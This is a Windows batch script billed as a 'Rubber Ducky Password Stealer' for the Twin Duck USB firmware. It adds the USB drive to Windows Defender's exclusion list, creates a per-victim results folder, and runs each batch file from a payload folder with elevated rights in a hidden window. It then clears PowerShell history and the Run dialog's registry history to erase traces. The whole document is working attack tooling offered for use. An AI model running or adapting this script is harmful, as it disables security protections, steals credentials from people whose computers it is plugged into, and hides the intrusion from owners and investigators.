REM ######################################################
REM # Title: Rubber Ducky Password Stealer               #
REM # Description: CMD script for the Twin Duck firmware #
REM # Target: Windows 10/11 x32/x64                      #
REM # Author: Krouwndouwn                                #
REM # Version: 1.1                                       #
REM ######################################################

@echo off

REM ----- Variables -----
set scripts_folder=%~d0\files\scripts
set results_folder=%~d0\results\%USERDOMAIN%@%USERNAME%

REM ----- Add storage exclusion to Windows Security -----
powershell Add-MpPreference -ExclusionPath '%~d0\'

REM ----- Create results folders -----
if not exist %results_folder% MD %results_folder%

REM ----- Execute scripts found inside the script folder -----
for /r %scripts_folder% %%f in (*.bat) do powershell -Command Start-Process %scripts_folder%\%%~nxf -Verb RunAs -WindowStyle Hidden

REM ----- Clear command history -----
powershell "Clear-History"
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

exit